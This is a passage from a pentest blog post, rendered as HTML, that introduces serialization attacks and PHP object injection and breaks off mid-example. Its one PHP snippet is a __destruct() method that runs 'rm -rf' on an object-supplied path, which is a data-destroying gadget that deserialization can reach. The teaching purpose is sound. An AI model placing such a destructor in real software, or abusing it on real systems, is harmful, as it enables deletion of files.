<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Understanding Attack Serialization: An Introduction" />
<meta property="og:locale" content="en" />
<meta name="description" content="Today, we will discuss serialization and the risks associated with this technique. Serialization is a common technique used in software development to convert complex objects into a format that can be easily stored or transmitted. This process allows data to be saved in files, sent over networks, or passed between different components of an application. However, serialization also introduces significant security risks if not properly managed. When an application deserializes untrusted data, it becomes vulnerable to various attacks." />
<meta property="og:description" content="Today, we will discuss serialization and the risks associated with this technique. Serialization is a common technique used in software development to convert complex objects into a format that can be easily stored or transmitted. This process allows data to be saved in files, sent over networks, or passed between different components of an application. However, serialization also introduces significant security risks if not properly managed. When an application deserializes untrusted data, it becomes vulnerable to various attacks." />
<link rel="canonical" href="http://0.0.0.0:3000/posts/Attacking-Serialization/" />
<meta property="og:url" content="http://0.0.0.0:3000/posts/Attacking-Serialization/" />
<meta property="og:image" content="http://0.0.0.0:3000/../assets/img/study/attackserialization/attack.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-07-31T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://0.0.0.0:3000/../assets/img/study/attackserialization/attack.png" />
<meta property="twitter:title" content="Understanding Attack Serialization: An Introduction" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-07-31T00:00:00+00:00","datePublished":"2024-07-31T00:00:00+00:00","description":"Today, we will discuss serialization and the risks associated with this technique. Serialization is a common technique used in software development to convert complex objects into a format that can be easily stored or transmitted. This process allows data to be saved in files, sent over networks, or passed between different components of an application. However, serialization also introduces significant security risks if not properly managed. When an application deserializes untrusted data, it becomes vulnerable to various attacks.","headline":"Understanding Attack Serialization: An Introduction","image":"http://0.0.0.0:3000/../assets/img/study/attackserialization/attack.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:3000/posts/Attacking-Serialization/"},"url":"http://0.0.0.0:3000/posts/Attacking-Serialization/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Understanding Attack Serialization: An Introduction | 
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link
  rel="apple-touch-icon"
  sizes="180x180"
  href="/assets/img/favicons/apple-touch-icon.png"
/>
<link
  rel="icon"
  type="image/png"
  sizes="32x32"
  href="/assets/img/favicons/favicon-32x32.png"
/>
<link
  rel="icon"
  type="image/png"
  sizes="16x16"
  href="/assets/img/favicons/favicon-16x16.png"
/>

<link rel="manifest" href="/assets/img/favicons/site.q" />

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" />
<meta name="apple-mobile-web-app-title" content="" />
<meta name="application-name" content="" />
<meta name="msapplication-TileColor" content="#da532c" />
<meta
  name="msapplication-config"
  content="/assets/img/favicons/browserconfig.xml"
/>
<meta name="theme-color" content="#ffffff" />


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.27.20/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/commons/avatar.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">H3NDR1CH</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Writeup's - Tools - Pentest Guide</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
      <li class="nav-item">
        <a href="/categories/" class="nav-link">
          <i class="fa-fw fas fa-stream"></i>
          

          <span>CATEGORIES</span>
        </a>
      </li>
      <!-- .nav-item -->
      
      <li class="nav-item">
        <a href="/tags/" class="nav-link">
          <i class="fa-fw fas fa-tags"></i>
          

          <span>TAGS</span>
        </a>
      </li>
      <!-- .nav-item -->
      
      <li class="nav-item">
        <a href="/archives/" class="nav-link">
          <i class="fa-fw fas fa-archive"></i>
          

          <span>ARCHIVES</span>
        </a>
      </li>
      <!-- .nav-item -->
      
      <li class="nav-item">
        <a href="/about/" class="nav-link">
          <i class="fa-fw fas fa-info-circle"></i>
          

          <span>ABOUT</span>
        </a>
      </li>
      <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap align-items-center w-100">
    

    
    <a href="https://github.com/arthurhendrich" aria-label="GitHub" target="_blank" rel="noopener noreferrer">
      <i class="fab fa-github"></i>
    </a>
    <a href="https://www.linkedin.com/in/arthurhendrich" aria-label="LinkedIn" target="_blank" rel="noopener noreferrer">
      <i class="fab fa-linkedin"></i>
    </a>
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->

    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Understanding Attack Serialization: An Introduction</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Understanding Attack Serialization: An Introduction</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1722384000"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jul 31, 2024
</time>

      </span>

      <!-- lastmod date -->
      

      
      
      
      

      

      <div class="mt-3 mb-3">
        <a href="/../assets/img/study/attackserialization/attack.png" class="popup img-link preview-img shimmer"><img src="/../assets/img/study/attackserialization/attack.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
            <a href="">H3NDR1CH</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="8762 words"
>
  <em>48 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  <div class="content">
    <p>Today, we will discuss serialization and the risks associated with this technique. Serialization is a common technique used in software development to convert complex objects into a format that can be easily stored or transmitted. This process allows data to be saved in files, sent over networks, or passed between different components of an application. However, serialization also introduces significant security risks if not properly managed. When an application deserializes untrusted data, it becomes vulnerable to various attacks.</p>

<hr />

<h2 id="initial-concept"><span class="me-2">Initial Concept</span><a href="#initial-concept" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<hr />

<p><strong>Serialization</strong> is the name of the mechanism that allows us to <strong>store the state of programmistic objects</strong> in a sequency of bytes in a reversible way.</p>

<p>This way, an <strong>object</strong> can be <strong>transported</strong> remotely to <strong>another program</strong>.</p>

<p>The <strong>receiving endpoint</strong> should be able to reconstruct - <strong>deserialize</strong> - the received object in an unchanged state.</p>

<p>Serialization is used widely in programming and can be used for</p>

<ul>
  <li><strong>Storing and transferring data</strong></li>
  <li><strong>Calling remote procedures (RPC-like methods)</strong></li>
</ul>

<p>Serializing data is also often referred to as <strong>marshalling</strong>. The reverse process of retrieving the original object out of a byte sequence is called <strong>deserialization</strong> or <strong>unmarshalling</strong></p>

<p>Serialized data itself is not encrypted or signed in any way. Often, the data might be freely tampered with once spotted, which might bring unexpected results on the deserializing component.</p>

<p>Serialized objects are most often encountered in WebAPP written in <strong>PHP, Java, .NET</strong>, but serialization is not limited to these languages only.</p>

<p>Serialization <strong>might not ONLY</strong> be present on the WebAPP layer. An serialized object can be:</p>

<p><a href="/../assets/img/study/attackserialization/Untitled.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled.png" alt="Untitled" loading="lazy"></a></p>

<p><strong>Pop chain/Object chain/Object injection</strong></p>

<p>In the context of security vulnerabilities, these terms refer to techniques where objects within a system are concatenated, often leveraging third-party libraries. By creating a chain of functions, attackers can manipulate requests and potentially execute arbitrary code within the system.</p>

<h2 id="serialization-in-php"><span class="me-2">Serialization in PHP</span><a href="#serialization-in-php" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<hr />

<p>In PHP, there are ‘magic functions.’ These are predefined functions that you don’t need to create yourself, and they have specific purposes.</p>

<p>For example, the <code class="language-plaintext highlighter-rouge">__construct()</code> function is used as a constructor method:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user'</span><span class="p">];</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">role</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'role'</span><span class="p">];</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">isauth</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Additionally, there is something akin to a ‘garbage collector,’ which can handle tasks like deleting files. This can be done using the <code class="language-plaintext highlighter-rouge">__destruct()</code> function:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
    <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"rm -rf "</span> <span class="mf">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"*"</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>These magic functions in PHP provide automatic handling of object initialization and cleanup, making your code more efficient and easier to manage.</p>

<p><em>Abusing control over PHP serialized object is also called <code class="language-plaintext highlighter-rouge">PHP Object Injection</code></em></p>

<p>PHP uses the <code class="language-plaintext highlighter-rouge">serialize()</code> and <code class="language-plaintext highlighter-rouge">unserialize()</code> functions to perform serialization</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">(de)serialization</code>is used to store/transfer/transform whole objects → <em>Like in Java</em></li>
  <li>Serialization is in <strong>non-binary</strong> <strong>format</strong> - <em>Similar to a JSON array / Human-readable → Unlike Java</em></li>
</ul>

<p>PHP serialized string looks like</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
